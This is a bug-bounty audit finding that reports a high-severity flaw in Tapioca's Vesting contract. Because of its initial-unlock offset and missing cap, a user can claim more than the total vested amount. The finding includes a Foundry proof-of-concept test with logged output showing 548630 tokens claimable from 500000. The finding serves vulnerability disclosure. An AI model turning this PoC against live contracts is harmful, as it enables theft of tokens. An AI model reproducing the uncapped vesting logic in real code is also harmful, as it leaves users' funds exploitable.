# [H] User Can Claim More Than totalAmount Due to Lack of Max Return Amount Check in _vested Function

## Summary
Severity: High
Chain: Smart contract
Component: Tapioca
Published: 2024-06-05
Source: https://github.com/hats-finance/Tapioca-0xe0b920d38a0900af3bab7ff0ca0af554129f54ad/issues/39
Type: hats-finding

## Details
**Github username:** --
**Twitter username:** --
**Submission hash (on-chain):** 0x5caa93ee07135e02720c099e9d01cc00ad866269213415a65a670bd24d932afe
**Severity:** high

**Description:**
**Description**\
The `_vested` function in the Vesting contract has a potential issue where users can claim more than the total vested amount due to improper logic handling of initial unlock and  no max return value check(refer POC)

**Attack Scenario**\
if the user deposits 500,000 tokens with initialUnlockAmount 50,000 then user can claim ~549000 tokens(i.e ~49k extra tokens) just before the end of duration

**Attachments**

1. **Proof of Concept (PoC) File**
<!-- You must provide a file containing a proof of concept (PoC) that demonstrates the vulnerability you have discovered. -->
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "forge-std/Test.sol";
//import "../src/Vesting.sol";


contract TapiocaTest is Test{


    //alex:
    //totalAmout = 500,000;
    //initial unlock = 10% i.e 50,000
    //duration = 4 years

    uint256 public start = 1717575083;//current timestamp i.e 5 june 2024
   
    uint256 public  cliff = 0;
    
    uint256 public duration = 4*365 days;//duration of 4 years

    address public owner = address(123);//owner of the contract

    uint __initialUnlockTimeOffset = 0; //update in test_initial function

    uint totalAmount = 500000;
    uint initialUnlockAmount = 50000;


    
    function _computeTimeFromAmount(uint256 _start, uint256 _totalAmount, uint256 _amount, uint256 _duration)
        public
        pure
        returns (uint256)
    {
        return _start - (_start - ((_amount * _duration) / _totalAmount));
    }


     function _vested(uint256 _totalAmount) public view returns (uint256) {//current implementation in the vesting.sol
        uint256 _cliff = cliff;
        uint256 _start = start;
        uint256 _duration = duration;

        if (_start == 0) return 0; // Not started

        if (_cliff > 0) {
            _start = _start + _cliff; // Apply cliff offset
            if (block.timestamp < _start) return 0; // Cliff not reached
        }

        if (block.timestamp >= _start + _duration) return _totalAmount; // Fully vested

        _start = _start - __initialUnlockTimeOffset; // Offset initial unlock so it's claimable immediately
        return (_totalAmount * (block.timestamp - _start)) / _duration; // Partially vested
    }

    function test_initial() public{

        console.log("start(5 june 2024) : ",start);
        console.log("duration(5 june 2028) : ",duration);
        console.log("totalAmount : ",totalAmount);
        console.log("initialUnlockAmount : ",initialUnlockAmount);
        
        uint  initialUnlockTimeOffset = _computeTimeFromAmount(start, totalAmount, initialUnlockAmount, duration);//unlocking 10% i,e 50,000 of 500,000
        console.log("initialUnlockTimeOffset : ", initialUnlockTimeOffset);
        __initialUnlockTimeOffset =  initialUnlockTimeOffset;


        vm.warp(start+4*364 days);//user will get extra 48630 tokens  this is due to adjustment in the _vested function  i.e ` _start = _start - __initialUnlockTimeOffset;` and no max return value check i.e totalAmount.due to adjustment in the `_start` the tokens will be fully vested before the duration now user can wait upto _duration-1 days and claim 548630 i.e more than totalAmount
        uint vestedAmount = _vested(totalAmount);
        console.log("vestedAmount just before the duration : ",vestedAmount);//here user just call the claim function just before the duration is completed and claim a huge 548630 amount tokens

        vm.warp(start+4*365 days);
         uint vestedAmount_afterDuration = _vested(totalAmount);
        console.log("vestedAmount after the duration : ",vestedAmount_afterDuration);

    }
}
```
forge test --match-test test_initial -vvv

```
[⠊] Compiling...
[⠆] Compiling 1 files with Solc 0.8.23
[⠰] Solc 0.8.23 finished in 1.16s
Compiler run successful!

Ran 1 test for test/tap.t.sol:TapiocaTest
[PASS] test_initial() (gas: 46261)
Logs:
  start(5 june 2024) :  1717575083
  duration(5 june 2028) :  126144000
  totalAmount :  500000
  initialUnlockAmount :  50000
  initialUnlockTimeOffset :  12614400
  vestedAmount just before the duration :  548630
  vestedAmount after the duration :  500000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 539.99µs (239.53µs CPU time)

Ran 1 test suite in 17.92ms (539.99µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

2. **Revised Code File (Optional)**
<!-- If possible, please provide a second file containing the revised code that offers a potential fix for the vulnerability. This file should include the following information:
- Comment with a clear explanation of the proposed fix.
- The revised code with your suggested changes.
- Any additional comments or explanations that clarify how the fix addresses the vulnerability. -->

working on it....
  
**Files:**
  - Vesting.sol (https://hats-backend-prod.herokuapp.com/v1/files/QmfPzxRGGypsnB8PrMyaGaiSHHmMt29HWnPdXdZzQqeVQm)
  - tap.t.sol (https://hats-backend-prod.herokuapp.com/v1/files/QmSZkcGG1oVKvXA8P3wXeCQGDNCKA4CGgsJERrfUctpoZr)
